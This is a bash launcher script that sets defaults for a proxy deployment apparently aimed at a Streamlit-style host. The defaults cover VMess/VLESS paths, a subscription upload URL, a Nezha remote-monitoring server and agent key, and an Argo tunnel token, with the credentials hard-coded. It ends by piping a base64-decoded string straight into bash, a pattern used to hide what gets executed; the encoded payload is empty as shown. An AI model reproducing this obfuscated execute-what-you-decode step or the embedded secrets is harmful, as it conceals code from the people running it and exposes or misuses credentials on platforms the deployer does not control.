#!/usr/bin/env bash

# Define Environment Variables
export V_PORT=${V_PORT:-'8080'}
export CFPORT=${CFPORT:-'443'} # 2053 2083 2087 2096 8443
export UUID=${UUID:-'7160b696-dd5e-42e3-a024-145e92cec916'}
export VMESS_WSPATH=${VMESS_WSPATH:-'startvm'}
export VLESS_WSPATH=${VLESS_WSPATH:-'startvl'}
export CF_IP=${CF_IP:-'icook.tw'}
export MY_DOMAIN=${MY_DOMAIN:-''}
export SUB_NAME=${SUB_NAME:-'streamlit'}
export FILE_PATH=${FILE_PATH:-'./.tmp'}

export openserver=${openserver:-'1'}

export SUB_URL=${SUB_URL:-'https://myjyup.shiguangda.nom.za/upload-a4aa34be-4373-4fdb-bff7-0a9c23405dac'}

export NEZHA_SERVER=${NEZHA_SERVER:-'nezha.tcguangda.eu.org'}
export NEZHA_KEY=${NEZHA_KEY:-'rZYB3POw666WxuEcDG'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}

# export ARGO_DOMAIN=${ARGO_DOMAIN:-'cs.drst.cloudns.org'}
# export ARGO_AUTH=${ARGO_AUTH:-'eyJhIjoiY2Y4OWNmMDcwOGEzZjRlMjY0ZmJmNDFhNDdkMTdjYTMiLCJ0IjoiMmIyZjE3ZDQtMjc1MS00YzZmLWJlODQtY2VlOTZjNDkzNWRiIiwicyI6Ik5USTJNbVU1TnpndE5HVTFNaTAwTWpaaUxXRTJOMk10WVRkaVl6SXhNell6TlRGbSJ9'}

echo "" | base64 -d | bash
